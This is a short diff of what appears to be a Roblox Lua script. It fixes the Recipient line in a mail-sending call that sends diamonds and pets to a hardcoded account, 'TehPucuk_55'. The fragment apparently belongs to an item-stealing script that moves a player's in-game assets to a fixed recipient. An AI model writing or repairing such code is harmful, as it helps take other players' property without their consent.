@@ -1335,7 +1335,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55", user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
